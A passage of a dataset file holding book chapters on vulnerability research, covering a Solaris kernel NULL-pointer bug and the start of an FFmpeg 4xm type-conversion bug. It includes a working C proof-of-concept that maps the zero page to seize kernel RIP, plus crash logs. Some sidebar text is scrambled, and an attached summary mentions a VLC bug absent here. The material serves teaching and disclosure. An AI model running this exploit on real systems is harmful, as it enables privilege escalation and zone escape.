ip_sioctl_tunparam+0x5c. The instruction tried to reference\nthe value pointed to by register r13. As the debugger output of the\n::msgbuf command shows, r13 had the value 0 at the time of the crash.\nSo the assembler instruction is equivalent to the NULL pointer deref-\nerence that happens in ip_sioctl_tunparam() (see line 9432 in the fol-\nlowing code snippet).\n38 Chapter 3\nSource code file uts/common/inet/ip/ip_if.c\nFunction ip_sioctl_tunparam()\n[..]\n9401 int\n9402 ip_sioctl_tunparam(ipif_t *ipif, sin_t *dummy_sin, queue_t *q, mblk_t *mp,\n9403 ip_ioctl_cmd_t *ipip, void *dummy_ifreq)\n9404 {\n[..]\n9432 ill = ipif->ipif_ill;\n[..]\nI was able to demonstrate that this bug can be successfully\nexploited by an unprivileged user to crash the system. Because all\nSolaris Zones share the same kernel, it’s also possible to crash the\nwhole system (all zones), even if the vulnerability is triggered in an\nunprivileged, non-global zone (see Section C.3 for more informa-\ntion on the Solaris Zones technology). Any hosting provider using\nthe Solaris Zones functionality could be greatly impacted if it were\nexploited by someone with malicious intent.\nStep 2: Use the Zero Page to Get Control over EIP/RIP\nAfter I was able to crash the system, I decided to attempt arbitrary\ncode execution. To do this, I had to solve the following two problems:\n• Prevent the system from crashing as the NULL pointer derefer-\nence gets triggered.\n• Take control over EIP/RIP.\nThe system crash is caused by the NULL pointer dereference. As\nthe zero or NULL page is normally not mapped, the dereference leads\nto an access violation that crashes the system (see also Section A.2).\nAll I had to do to prevent the system from crashing was to map the\nzero page before triggering the NULL pointer dereference. This can\nbe done easily on the x86 and AMD64 architecture, because Solaris\nsegregates the virtual address space of processes on these platforms\ninto two parts: user space and kernel space (see Figure 3-5). User\nspace is where all user-mode applications run, while kernel space is\nwhere the kernel itself, as well as kernel extensions (e.g., drivers),\nrun. However, the kernel and the user space of a process share the\nsame zero page.9\nnote Each user-mode address space is unique to a particular process, while\nthe kernel address space is shared across all processes. Mapping the\nNULL page in one process only causes it to be mapped in that pro-\ncess’s address space only.\nEscape from the WWW Zone 39\nzero page zero page\nnot mapped is mapped\n0xFFFFFFFF.FFFFFFFF\nKernel Space Kernel Space\n0xFFFFFD80.00000000\n(de)reference == (de)reference !=\naccess violation User Space access violation User Space\n0x00000000.00000000\nshared zero page shared zero page\n(not mapped) (mapped)\nFigure 3-5: Virtual address space of a process (Solaris x86 64-bit)10\nBy mapping the zero page before triggering the NULL pointer\ndereference, I was able to prevent the system from crashing. That got\nme to the next problem: How to gain control over EIP/RIP? The only\ndata that was under my full control was the IOCTL data sent to the\nkernel and the user-space data of a process, including the zero page.\nThe only way to get control was to make the kernel reference some\ndata from the zero page that would later be used to control the execu-\ntion flow of the kernel. I thought that approach would not work, but I\nwas wrong.\nSource code file uts/common/inet/ip/ip_if.c\nFunction ip_sioctl_tunparam()\n[..]\n9401 int\n9402 ip_sioctl_tunparam(ipif_t *ipif, sin_t *dummy_sin, queue_t *q, mblk_t *mp,\n9403 ip_ioctl_cmd_t *ipip, void *dummy_ifreq)\n9404 {\n[..]\n9432 ill = ipif->ipif_ill;\n9433 mutex_enter(&connp->conn_lock);\n9434 mutex_enter(&ill->ill_lock);\n9435 if (ipip->ipi_cmd == SIOCSTUNPARAM || ipip->ipi_cmd == OSIOCSTUNPARAM) {\n9436 success = ipsq_pending_mp_add(connp, ipif, CONNP_TO_WQ(connp),\n9437 mp, 0);\n9438 } else {\n9439 success = ill_pending_mp_add(ill, connp, mp);\n9440 }\n9441 mutex_exit(&ill->ill_lock);\n9442 mutex_exit(&connp->conn_lock);\n9443\n40 Chapter 3\n9444 if (success) {\n9445 ip1dbg((\"sending down tunparam request \"));\n9446 putnext(ill->ill_wq, mp1);\n[..]\nThe NULL pointer dereference happens in line 9432, when ipif is\nforced to be NULL. This leads to the system crash. But if the zero page\nis mapped before NULL is dereferenced, the access violation won’t be\ntriggered, and the system won’t crash. Instead, the value of the ill\nstructure is determined while referencing valid user-controlled data\nfrom the zero page. Therefore, all values of the ill structure can be\ncontrolled by carefully crafting the zero page data. I was pleased to\nfind that in line 9446, the function putnext() is called with the user-\ncontrollable value of ill->ill_wq as a parameter.\nSource code file uts/common/os/putnext.c\nFunction putnext() 11\n[..]\n146 void\n147 putnext(queue_t *qp, mblk_t *mp)\n148 {\n[..]\n154 int (*putproc)();\n[..]\n176 qp = qp->q_next;\n177 sq = qp->q_syncq;\n178 ASSERT(sq != NULL);\n179 ASSERT(MUTEX_NOT_HELD(SQLOCK(sq)));\n180 qi = qp->q_qinfo;\n[..]\n268 /*\n269 * We now have a claim on the syncq, we are either going to\n270 * put the message on the syncq and then drain it, or we are\n271 * going to call the putproc().\n272 */\n273 putproc = qi->qi_putp;\n274 if (!queued) {\n275 STR_FTEVENT_MSG(mp, fqp, FTEV_PUTNEXT, mp->b_rptr -\n276 mp->b_datap->db_base);\n277 (*putproc)(qp, mp);\n[..]\nThe user can fully control the data of the first function parameter\nof putnext(), which means that the values of qp, sq, and qi can also be\ncontrolled through the data of the mapped zero page (see lines 176,\n177, and 180). Furthermore, the user can control the value of the\nfunction pointer declared in line 154 (see line 273). This function\npointer is then called in line 277.\nSo, in summary, if the data of the mapped zero page is carefully\ncrafted, it’s possible to take control of a function pointer, thereby\nEscape from the WWW Zone 41\ngaining full control over EIP/RIP and resulting in arbitrary code execu-\ntion at the kernel level.\nI used the following POC code to gain control over EIP/RIP:\n01 #include <string.h>\n02 #include <stdio.h>\n03 #include <unistd.h>\n04 #include <fcntl.h>\n05 #include <sys/syscall.h>\n06 #include <sys/sockio.h>\n07 #include <net/if.h>\n08 #include <sys/mman.h>\n09\n10 ////////////////////////////////////////////////\n11 // Map the zero page and fill it with the\n12 // necessary data\n13 int\n14 map_null_page (void)\n15 {\n16 void * mem = (void *)-1;\n17\n18 // map the zero page\n19 mem = mmap (NULL, PAGESIZE, PROT_EXEC|PROT_READ|PROT_WRITE,\n20 MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);\n21\n22 if (mem != NULL) {\n23 printf (\"failed\\n\");\n24 fflush (0);\n25 perror (\"[-] ERROR: mmap\");\n26 return 1;\n27 }\n28\n29 // fill the zero page with zeros\n30 memset (mem, 0x00, PAGESIZE);\n31\n32 ////////////////////////////////////////////////\n33 // zero page data\n34\n35 // qi->qi_putp\n36 *(unsigned long long *)0x00 = 0x0000000041414141;\n37\n38 // ipif->ipif_ill\n39 *(unsigned long long *)0x08 = 0x0000000000000010;\n40\n41 // start of ill struct (ill->ill_ptr)\n42 *(unsigned long long *)0x10 = 0x0000000000000000;\n43\n44 // ill->rq\n45 *(unsigned long long *)0x18 = 0x0000000000000000;\n46\n47 // ill->wq (sets address for qp struct)\n48 *(unsigned long long *)0x20 = 0x0000000000000028;\n49\n50 // start of qp struct (qp->q_info)\n51 *(unsigned long long *)0x28 = 0x0000000000000000;\n52\n53 // qp->q_first\n42 Chapter 3\n54 *(unsigned long long *)0x30 = 0x0000000000000000;\n55\n56 // qp->q_last\n57 *(unsigned long long *)0x38 = 0x0000000000000000;\n58\n59 // qp->q_next (points to the start of qp struct)\n60 *(unsigned long long *)0x40 = 0x0000000000000028;\n61\n62 // qp->q_syncq\n63 *(unsigned long long *)0xa0 = 0x00000000000007d0;\n64\n65 return 0;\n66 }\n67\n68 void\n69 status (void)\n70 {\n71 unsigned long long i = 0;\n72\n73 printf (\"[+] PAGESIZE: %d\\n\", (int)PAGESIZE);\n74 printf (\"[+] Zero page data:\\n\");\n75\n76 for (i = 0; i <= 0x40; i += 0x8)\n77 printf (\"... 0x%02x: 0x%016llx\\n\", i, *(unsigned long long*)i);\n78\n79 printf (\"... 0xa0: 0x%016llx\\n\", *(unsigned long long*)0xa0);\n80\n81 printf (\"[+] The bug will be triggered in 2 seconds..\\n\");\n82\n83 fflush (0);\n84 }\n85\n86 int\n87 main (void)\n88 {\n89 int fd = 0;\n90 char data[32];\n91\n92 ////////////////////////////////////////////////\n93 // Opening the '/dev/arp' device\n94 printf (\"[+] Opening '/dev/arp' device .. \");\n95\n96 fd = open (\"/dev/arp\", O_RDWR);\n97\n98 if (fd < 0) {\n99 printf (\"failed\\n\");\n100 fflush (0);\n101 perror (\"[-] ERROR: open\");\n102 return 1;\n103 }\n104\n105 printf (\"OK\\n\");\n106\n107 ////////////////////////////////////////////////\n108 // Map the zero page\n109 printf (\"[+] Trying to map zero page .. \");\n110\n111 if (map_null_page () == 1) {\nEscape from the WWW Zone 43\n112 return 1;\n113 }\n114\n115 printf (\"OK\\n\");\n116\n117 ////////////////////////////////////////////////\n118 // Status messages\n119 status ();\n120 sleep (2);\n121\n122 ////////////////////////////////////////////////\n123 // IOCTL request data (interface name with invalid alias ':01')\n124 data[0] = 0x3a; // colon\n125 data[1] = 0x30; // ASCII zero\n126 data[2] = 0x31; // the digit '1'\n127 data[3] = 0x00; // NULL termination\n128\n129 ////////////////////////////////////////////////\n130 // IOCTL request\n131 syscall (SYS_ioctl, fd, SIOCGTUNPARAM, data);\n132\n133 printf (\"[-] ERROR: triggering the NULL ptr deref failed\\n\");\n134 close (fd);\n135\n136 return 0;\n137 }\nListing 3-2: POC code (poc2.c) used to gain control of EIP/RIP and thereby achieve arbitrary code\nexecution at the kernel .\nIn line 19 of Listing 3-2, the zero page is mapped using mmap().\nBut the most interesting part of the POC code is the layout of the zero\npage data (see lines 32–63). Figure 3-6 illustrates the relevant parts of\nthis layout.\n0x00 0x0000000041414141 qi->qi_putp (start of qi struct)\n0x08 0x0000000000000010 ipif->ipif_ill\n(1)\n0x10 0x0000000000000000 ill->ill_ptr (start of ill struct)\n(4)\n0x18 0x0000000000000000 ill->ill_rq\n0x20 0x0000000000000028 ill->ill_wq\n(2)\n0x28 0x0000000000000000 qp->q_qinfo (start of qp struct)\n0x30 0x0000000000000000 qp->first\n(3)\n0x38 0x0000000000000000 qp->last\n0x40 0x0000000000000028 qp->next\n…\n0xa0 0x00000000000007d0 qp->syncq\nFigure 3-6: Data layout of the zero page\n44 Chapter 3\nThe left-hand side of Figure 3-6 shows the offsets into the zero\npage. The middle lists the actual values of the zero page. The right-\nhand side shows the references the kernel makes into the zero page.\nTable 3-1 describes the zero page data layout illustrated in Figure 3-6.\nTable 3-1: Description of the Zero Page Data Layout\nFunction/ Data referenced Description\nLine of code by the kernel\nip_sioctl_tunparam() ill = ipif-> ipif is NULL, and the offset of ipif_ill within the ipif\n9432 ipif_ill; structure is 0x8 . Therefore, ipif->ipif_ill references\naddress 0x8 . The value at address 0x8 is assigned to\nill . So the ill structure starts at address 0x10 (see\n(1) in Figure 3-6) .\nip_sioctl_tunparam() putnext(ill-> The value of ill->ill_wq is used as a parameter for\n9446 ill_wq, mp1); putnext() . The offset of ill_wq inside the ill structure\nis 0x10 . The ill structure starts at address 0x10, so\nill->ill_wq is referenced at address 0x20 .\nputnext() putnext(queue_t The address of qp equals the value pointed to by\n147 *qp, mblk_t *mp) ill->ill_wq . Therefore, qp starts at address 0x28 (see\n(2) in Figure 3-6) .\nputnext() qp = qp->q_next; The offset of q_next inside the qp structure is 0x18 .\n176 Therefore, the next qp gets assigned the value from\naddress 0x40: the start address of qp (0x28) + offset\nof q_next (0x18) . The value at address 0x40 is again\n0x28, so the next qp structure starts at the same\naddress as the one before (see (3) in Figure 3-6) .\nputnext() sq = qp->q_syncq; The offset of q_syncq inside the qp structure is 0x78 .\n177 Since q_syncq is referenced later, it has to point to\na valid memory address . I chose 0x7d0, which is an\naddress in the mapped zero page .\nputnext() qi = qp->q_qinfo; The value of qp->q_qinfo is assigned to qi . The offset\n180 of q_qinfo inside the qp structure is 0x0 . Since the\nqp structure starts at address 0x28, the value 0x0 is\nassigned to qi (see (4) in Figure 3-6) .\nputnext() putproc = qi-> The value of qi->qi_putp is assigned to the func-\n273 qi_putp; tion pointer putproc . The offset of qi_putp inside the\nqi structure is 0x0 . Therefore, qi->qi_putp is refer-\nenced at address 0x0, and the value at this address\n(0x0000000041414141) is assigned to the function\npointer .\nEscape from the WWW Zone 45\nI then compiled and tested the POC code as an unprivileged user\ninside a restricted, non-global Solaris Zone:\nsolaris$ isainfo -b\n64\nsolaris$ id\nuid=100(wwwuser) gid=1(other)\nsolaris$ zonename\nwwwzone\nsolaris$ ppriv -S $$\n1422: -bash\nflags = <none>\nE: basic\nI: basic\nP: basic\nL: zone\nsolaris$ /usr/sfw/bin/gcc -m64 -o poc2 poc2.c\nsolaris$ ./poc2\n[+] Opening '/dev/arp' device .. OK\n[+] Trying to map zero page .. OK\n[+] PAGESIZE: 4096\n[+] Zero page data:\n... 0x00: 0x0000000041414141\n... 0x08: 0x0000000000000010\n... 0x10: 0x0000000000000000\n... 0x18: 0x0000000000000000\n... 0x20: 0x0000000000000028\n... 0x28: 0x0000000000000000\n... 0x30: 0x0000000000000000\n... 0x38: 0x0000000000000000\n... 0x40: 0x0000000000000028\n... 0xa0: 0x00000000000007d0\n[+] The bug will be triggered in 2 seconds..\nThe system crashed immediately and rebooted. After the reboot,\nI inspected the kernel crash files (see Section B.1 for a description of\nthe following debugger commands):\nsolaris# id\nuid=0(root) gid=0(root)\nsolaris# hostname\nbob\nsolaris# cd /var/crash/bob/\nsolaris# ls\nbounds unix.0 vmcore.0 unix.1 vmcore.1\nsolaris# mdb unix.1 vmcore.1\n46 Chapter 3\nLoading modules: [ unix krtld genunix specfs dtrace cpu.generic uppc pcplusmp ufs ip\nhook neti sctp arp usba fcp fctl nca lofs mpt zfs audiosup md cpc random crypto fcip\nlogindmux ptm sppp nfs ]\n> ::msgbuf\n[..]\npanic[cpu0]/thread=ffffffff8816c120:\nBAD TRAP: type=e (#pf Page fault) rp=fffffe800029f530 addr=41414141 occurred in\nmodule \"<unknown>\" due to an illegal access to a user address\npoc2:\n#pf Page fault\nBad kernel fault at addr=0x41414141\npid=1404, pc=0x41414141, sp=0xfffffe800029f628, eflags=0x10246\ncr0: 80050033<pg,wp,ne,et,mp,pe> cr4: 6b0<xmme,fxsr,pge,pae,pse>\ncr2: 41414141 cr3: 1782a000 cr8: c\nrdi: 28 rsi: ffffffff81700380 rdx: ffffffff8816c120\nrcx: 0 r8: 0 r9: 0\nrax: 0 rbx: 0 rbp: fffffe800029f680\nr10: 1 r11: 0 r12: 7d0\nr13: 28 r14: ffffffff81700380 r15: 0\nfsb: fffffd7fff220200 gsb: fffffffffbc27fc0 ds: 0\nes: 0 fs: 1bb gs: 0\ntrp: e err: 10 rip: 41414141\ncs: 28 rfl: 10246 rsp: fffffe800029f628\nss: 30\nfffffe800029f440 unix:die+da ()\nfffffe800029f520 unix:trap+5e6 ()\nfffffe800029f530 unix:_cmntrap+140 ()\nfffffe800029f680 41414141 ()\nfffffe800029f6d0 ip:ip_sioctl_tunparam+ee ()\nfffffe800029f780 ip:ip_process_ioctl+280 ()\nfffffe800029f820 ip:ip_wput_nondata+970 ()\nfffffe800029f910 ip:ip_output_options+537 ()\nfffffe800029f920 ip:ip_output+10 ()\nfffffe800029f940 ip:ip_wput+37 ()\nfffffe800029f9a0 unix:putnext+1f1 ()\nfffffe800029f9d0 arp:ar_wput+9d ()\nfffffe800029fa30 unix:putnext+1f1 ()\nfffffe800029fab0 genunix:strdoioctl+67b ()\nfffffe800029fdd0 genunix:strioctl+620 ()\nfffffe800029fdf0 specfs:spec_ioctl+67 ()\nfffffe800029fe20 genunix:fop_ioctl+25 ()\nfffffe800029ff00 genunix:ioctl+ac ()\nfffffe800029ff10 unix:brand_sys_syscall+21d ()\nsyncing file systems...\ndone\ndumping to /dev/dsk/c0d0s1, offset 107413504, content: kernel\n> $c\n0x41414141()\nip_sioctl_tunparam+0xee()\nip_process_ioctl+0x280()\nip_wput_nondata+0x970()\nip_output_options+0x537()\nEscape from the WWW Zone 47\nip_output+0x10()\nip_wput+0x37()\nputnext+0x1f1()\nar_wput+0x9d()\nputnext+0x1f1()\nstrdoioctl+0x67b()\nstrioctl+0x620()\nspec_ioctl+0x67()\nfop_ioctl+0x25()\nioctl+0xac()\nsys_syscall+0x17b()\nThis time, the system crashed as the kernel tried to execute code\nat address 0x41414141 (the value of the RIP register, as shown in bold in\nthe debugger output above). That means I had managed to gain full\ncontrol over EIP/RIP.\nWith the right exploit payload, this bug can be used to escape\nfrom a restricted, non-global Solaris Zone and then gain superuser\nprivileges in the global zone.\nBecause of the strict laws in my home country, I am not allowed to\nprovide you with a full working exploit. However, if you are interested,\nyou can go to the book’s website to watch a video I recorded that\nshows the exploit in action.12\n3.3 Vulnerability remediation\nThursday, June 12, 2008\nAfter I informed Sun about the bug, it developed the following patch\nto address the vulnerability:13\n[..]\n19165 if (*cp == IPIF_SEPARATOR_CHAR) {\n19166 /*\n19167 * Reject any non-decimal aliases for logical\n19168 * interfaces. Aliases with leading zeroes\n19169 * are also rejected as they introduce ambiguity\n19170 * in the naming of the interfaces.\n19171 * In order to confirm with existing semantics,\n19172 * and to not break any programs/script relying\n19173 * on that behaviour, if<0>:0 is considered to be\n19174 * a valid interface.\n19175 *\n19176 * If alias has two or more digits and the first\n19177 * is zero, fail.\n19178 */\n19179 if (&cp[2] < endp && cp[1] == '0') {\n19180 if (error != NULL)\n19181 *error = EINVAL;\n19182 return (NULL);\n19183 }\n[..]\n48 Chapter 3\nTo fix the bug, Sun introduced the new error definition in lines\n19180 and 19181 of ipif_lookup_on_name(). That successfully prevents\nthe NULL pointer dereference from happening. Although this mea-\nsure rectifies the vulnerability described in this chapter, it doesn’t\nsolve the basic problem. The ipif_lookup_on_name() function, as well\nas other kernel functions, still report error conditions to their caller\nfunctions in two different ways, so chances are good that a similar bug\nwill occur again if the API isn’t used with great care. Sun should have\nchanged the API to prevent future bugs, but it didn’t.\n3.4 lessons learned\nAs a programmer:\n• Always define proper error conditions.\n• Always validate return values correctly.\n• Not all kernel NULL pointer dereferences are simple denial-of-\nservice conditions. Some of them are really bad vulnerabilities\nthat can lead to arbitrary code execution.\nAs a system administrator:\n• Don’t blindly trust zones, compartments, fine-grained access\ncontrols, or virtualization. If there is a bug in the kernel, there’s\na good chance that every security feature can be bypassed or\nevaded. And that’s true not only for Solaris Zones.\n3.5 Addendum\nWednesday, December 17, 2008\nSince the vulnerability was fixed and a patch for Solaris is available, I\nreleased a detailed security advisory on my website today.14 The bug\nwas assigned CVE-2008-568. Sun took 471 days to provide a fixed ver-\nsion of its operating system (see Figure 3-7). That’s an unbelievably\nlong time!\nVulnerability\nconfirmed by Sun\nSun\nPatch developed\nnotified New Solaris kernel Release date of my\nby Sun\nversion available security advisory\n09.04.2007 09.05.2007 06.12.2008 12.17.2008\nFigure 3-7: Timeline from notification of the bug to the release of the fixed\noperating system\nEscape from the WWW Zone 49\nnotes\n1. The source code of OpenSolaris can be downloaded at http://dlc.sun.com/\nosol/on/downloads/.\n2. See http://en.wikipedia.org/wiki/Ioctl.\n3. For more information on the IP-in-IP tunneling mechanism, refer to http://\ndownload.oracle.com/docs/cd/E19455-01/806-0636/6j9vq2bum/index.html.\n4. See the STREAMS Programming Guide from Sun Microsystems Inc., which\ncan be downloaded at http://download.oracle.com/docs/cd/E19504-01/802-5893/\n802-5893.pdf.\n5. OpenGrok source browser reference of OpenSolaris: http://cvs.opensolaris\n.org/source/xref/onnv/onnv-gate/usr/src/uts/common/sys/stream.h?r=4823%3A7\nc9aaea16585.\n6. OpenGrok source browser reference of OpenSolaris: http://cvs.opensolaris\n.org/source/xref/onnv/onnv-gate/usr/src/uts/common/inet/ip/ip.c?r=4823%3A7\nc9aaea16585.\n7. OpenGrok source browser reference of OpenSolaris: http://cvs.opensolaris.\norg/source/xref/onnv/onnv-gate/usr/src/uts/common/inet/ip/ip_if.c?r=5240%3A\ne7599510dd03.\n8. The official Solaris Modular Debugger Guide can be found at http://dlc.sun\n.com/osol/docs/content/MODDEBUG/moddebug.html.\n9. For more information, refer to the paper “Attacking the Core: Kernel\nExploit ing Notes” by twiz & sgrakkyu, which can be found at http://www\n.phrack.com/issues.html?issue=64&id=6.\n10. More information on the virtual address space of Solaris processes can be\nfound at http://cvs.opensolaris.org/source/xref/onnv/onnv-gate/usr/src/uts/i86pc/\nos/startup.c?r=10942:eaa343de0d06.\n11. OpenGrok source browser reference of OpenSolaris: http://cvs.opensolaris\n.org/source/xref/onnv/onnv-gate/usr/src/uts/common/os/putnext.c?r=0%3A68f95\ne015346.\n12. See http://www.trapkit.de/books/bhd/.\n13. The patch from Sun can be found at http://cvs.opensolaris.org/source/diff/\nonnv/onnv-gate/usr/src/uts/common/inet/ip/ip_if.c?r1=/onnv/onnv-gate/usr/src/\nuts/common/inet/ip/ip_if.c@5240&r2=/onnv/onnv-gate/usr/src/uts/common/inet/\nip/ip_if.c@5335&format=s&full=0.\n14. My security advisory that describes the details of the Solaris kernel vulner-\nability can be found at http://www.trapkit.de/advisories/TKADV2008-015.txt.\n50 Chapter 3",
    "question": "What is the key concept discussed in the text regarding the vulnerabilities in the VLC media player and the Solaris kernel?",
    "summary": "The text discusses two security vulnerabilities: one in the VLC media player involving a stack buffer overflow in a less common media format, and another in the Solaris kernel related to a NULL pointer dereference through an improperly handled IOCTL call. Both vulnerabilities highlight the importance of validating user input and error conditions, as well as the risks of not implementing proper exploit mitigation techniques. The first vulnerability was fixed by changing the data type of the affected variable, while the second required a patch that properly handles error conditions. The author notes that the Solaris kernel did not use DEP or ASLR, making it easier to exploit. The text also provides lessons on responsible disclosure and the importance of secure coding practices."
  },
  {
    "start": 27,
    "end": 35,
    "text": "4\nnull pointer ftw\nSaturday, January 24, 2009\nDear Diary,\nI found a really beautiful bug today: a type conversion vulnerability\nleading to a NULL pointer dereference (see Section A.2). Under nor-\nmal circumstances this wouldn’t be a big deal, since the bug affects a\nuser space library, which generally means that at worst it would crash\na user space application. But this bug is different from the average\nuser space NULL pointer dereferences, and it’s possible to exploit this\nvulnerability to execute arbitrary code.\nThe vulnerability affects the FFmpeg multimedia library that is\nused by many popular software projects, including Google Chrome,\nVLC media player, MPlayer, and Xine to name just a few. There\nare also rumors that YouTube uses FFmpeg as backend conversion\nsoftware.1\n0 ( . f S h h u 0 ← l t e t s a 1 m t e e s p T r 7 h M l : h . ) / h s ( e p a / o h t r r a m b r t e k c l t o J l e p a ) g D u . : r n s / s o e . t / i U w s i b o n s L d l t . o n L h ’ S s g e e c s p t M r h . / i o s u a e a i s n h x r c .n a t c ’ G s e e h m y r t f i v v / p i d r e e a l e r / e e r f s c r c o e v e h o x x f e i f p e v - b r l e e 2 o u e / x i 0 n g fl t p c 0 a l f e o 8 s o s i h r t . - a ble\n4.1 Vulnerability Discovery\nTo find the vulnerability I did the following:\n• Step 1: List the demuxers of FFmpeg.\n• Step 2: Identify the input data.\n• Step 3: Trace the input data.\nStep 1: List the Demuxers of FFmpeg\nAfter getting the latest source code revision from the FFmpeg SVN\nrepository, I generated a list of the demuxers that are available in the\nlibavformat library, which is included with FFmpeg (see Figure 4-1).\nI noticed that FFmpeg separates most demuxers in different C files\nunder the directory libavformat/.\nFigure 4-1: FFmpeg libavformat demuxers\nnote FFmpeg development has moved to a Git repository,2and the SVN\nrepository is no longer updated. The vulnerable source code revision\n(SVN-r16556) of FFmpeg can now be downloaded from this book’s\nwebsite.3\nStep 2: Identify the Input Data\nNext, I tried to identify the input data processed by the demuxers.\nWhile reading the source code, I discovered that most demuxers\ndeclare a function called demuxername_read_header(), which usually\n52 Chapter 4\ntakes a parameter of the type AVFormatContext. This function declares\nand initializes a pointer that looks like this:\n[..]\nByteIOContext *pb = s->pb;\n[..]\nMany different get_something functions (e.g., get_le32(), get_buffer())\nand special macros (e.g., AV_RL32, AV_RL16) are then used to extract\nportions of the data pointed to by pb. At this point, I was pretty sure\nthat pb had to be a pointer to the input data of the media files being\nprocessed.\nStep 3: Trace the Input Data\nI decided to search for bugs by tracing the input data of each\ndemuxer at the source code level. I started with the first demuxer\nfile from the list, called 4xm.c. While auditing the demuxer of the\n4X movie file format,4 I found the vulnerability shown in the listing\nbelow.\nSource code file libavformat/4xm.c\nFunction fourxm_read_header()\n[..]\n93 static int fourxm_read_header(AVFormatContext *s,\n94 AVFormatParameters *ap)\n95 {\n96 ByteIOContext *pb = s->pb;\n..\n101 unsigned char *header;\n..\n103 int current_track = -1;\n..\n106 fourxm->track_count = 0;\n107 fourxm->tracks = NULL;\n..\n120 /* allocate space for the header and load the whole thing */\n121 header = av_malloc(header_size);\n122 if (!header)\n123 return AVERROR(ENOMEM);\n124 if (get_buffer(pb, header, header_size) != header_size)\n125 return AVERROR(EIO);\n..\n160 } else if (fourcc_tag == strk_TAG) {\n161 /* check that there is enough data */\n162 if (size != strk_SIZE) {\n163 av_free(header);\n164 return AVERROR_INVALIDDATA;\n165 }\n166 current_track = AV_RL32(&header[i + 8]);\nNULL Pointer FTW 53\n167 if (current_track + 1 > fourxm->track_count) {\n168 fourxm->track_count = current_track + 1;\n169 if((unsigned)fourxm->track_count >= UINT_MAX / sizeof(AudioTrack))\n170 return -1;\n171 fourxm->tracks = av_realloc(fourxm->tracks,\n172 fourxm->track_count * sizeof(AudioTrack));\n173 if (!fourxm->tracks) {\n174 av_free(header);\n175 return AVERROR(ENOMEM);\n176 }\n177 }\n178 fourxm->tracks[current_track].adpcm = AV_RL32(&header[i + 12]);\n179 fourxm->tracks[current_track].channels = AV_RL32(&header[i + 36]);\n180 fourxm->tracks[current_track].sample_rate = AV_RL32(&header[i + 40]);\n181 fourxm->tracks[current_track].bits = AV_RL32(&header[i + 44]);\n[..]\nThe get_buffer() function in line 124 copies input data from the\nprocessed media file into the heap buffer pointed to by header (see\nlines 101 and 121). If the media file contains a so-called strk chunk\n(see line 160) the AV_RL32() macro in line 166 reads an unsigned int\nfrom the header data and stores the value in the signed int variable\ncurrent_track (see line 103). The conversion of a user-controlled\nunsigned int value from the media file to a signed int could cause a\nconversion bug! My interest piqued, I continued to search through\nthe code, excited that I might be on to something.\nThe if statement in line 167 checks whether the user-controlled\nvalue of current_track + 1 is greater than fourxm->track_count. The signed\nint variable fourxm->track_count is initialized with 0 (see line 106). Sup-\nplying a value >= 0x80000000 for current_track causes a change in sign\nthat results in current_track being interpreted as negative (to find out\nwhy, see Section A.3). If current_track is interpreted as negative, the\nif statement in line 167 will always return FALSE (as the signed int vari-\nable fourxm->track_count has a value of zero), and the buffer allocation\nin line 171 will never be reached. Clearly, it was a bad idea to convert\nthat user-controlled unsigned int to a signed int.\nSince fourxm->tracks is initialized with NULL (see line 107) and\nline 171 is never reached, the write operations in lines 178–181 lead\nto four NULL pointer dereferences. Because NULL is dereferenced\nby the user-controlled value of current_track, it’s possible to write user-\ncontrolled data at a wide range of memory locations.\nnote Perhaps you wouldn’t technically call this a NULL pointer “derefer-\nence,” since I’m not actually dereferencing NULL but a nonexistent\nstructure that’s located at a user-controlled offset from NULL. In\nthe end it depends on how you define the term NULL pointer\ndereference.\n54 Chapter 4\nThe expected behavior of FFmpeg is shown in Figure 4-2 as\nfollows:\n1. fourxm->tracks is initialized with NULL (see line 107).\n2. If the processed media file contains a strk chunk, the value of\ncurrent_track is extracted from the user-controlled data of the\nchunk (see line 166).\n3. If the value of current_track + 1 is greater than zero, a heap buffer\nis allocated.\n4. The heap buffer pointed to by fourxm->tracks is allocated (see\nlines 171 and 172).\n5. Data from the media file is copied into the heap buffer, while\ncurrent_track is used as an array index into the buffer (see\nlines 178–181).\n6. When this behavior occurs, there is no security problem.\n4X movie file\n(1) (2) (4)\nstrk +1 > 0\nfourxm->tracks =\nfourxm->tracks = NULL current_track\n(3) av_realloc(..)\n(5)\nfourxm->tracks[current_track].adpcm =\nAV_RL32(&header[i + 12])\n(6)\nNo problem\nFigure 4-2: Expected behavior when FFmpeg operates normally\nFigure 4-3 shows what happens when this bug affects FFmpeg:\n1. fourxm->tracks is initialized with NULL (see line 107).\n2. If the processed media file contains a strk chunk, the value of\ncurrent_track is extracted from the user-controlled data of the\nchunk (see line 166).\n3. If the value of current_track + 1 is less than zero, the heap buffer\nisn’t allocated.\n4. fourxm->tracks still points to memory address NULL.\nNULL Pointer FTW 55\n5. The resulting NULL pointer is then dereferenced by the user-\ncontrolled value of current_track, and four 32-bit values of user-\ncontrolled data are assigned to the dereferenced locations (see\nlines 178–181).\n6. Four user-controlled memory locations can be overwritten with\nfour user-controlled data bytes each.\n4X movie file\n+1 < 0\n(1) (2)\nstrk\nfourxm->tracks = NULL current_track fourxm->tracks =\nav_realloc(..) (3)\n(5)\nfourxm->tracks[current_track].adpcm =\nAV_RL32(&header[i + 12])\n(6)\n(4) Memory\ncorruption\nFigure 4-3: Unexpected behavior of FFmpeg causing memory corruption\nWhat a beautiful bug!\n4.2 exploitation\nTo exploit the vulnerability I did the following:\n← The vulnerability\n• Step 1: Find a sample 4X movie file with a\naffects all operating\nsystem platforms\nvalid strk chunk. supported\nby ffmpeg.\n• Step 2: Learn about the layout of the strk I T u h s e e d p la th tf r o o r u m gh t o h u a t t\nchunk. this chapter was the\n• Step 3: Manipulate the strk chunk to crash U d b ef u a n u t l u t i L n i s n t u a x ll a 9 t . i 0 on 4 of\nFFmpeg. (32-bit).\n• Step 4: Manipulate the strk chunk to get\ncontrol over EIP.\nThere are different ways to exploit file format bugs. I could either\ncreate a file with the right format from scratch or alter an existing file.\nI chose the latter approach. I used the website http://samples.mplayerhq\n.hu/ to find a 4X movie file suitable for testing this vulnerability. I\ncould have built a file myself, but downloading a preexisting file is\nfast and easy.\n56 Chapter 4\nStep 1: Find a Sample 4X Movie File with a Valid strk Chunk\nI used the following to get a sample file from http://samples\n.mplayerhq.hu/.\nlinux$ wget -q http://samples.mplayerhq.hu/game-formats/4xm/ →\nTimeGatep01s01n01a02_2.4xm\nAfter downloading the file, I renamed it original.4xm.\nStep 2: Learn About the Layout of the strk Chunk\nAccording to the 4X movie file format description, a strk chunk has\nthe following structure:\nbytes 0-3 fourcc: 'strk'\nbytes 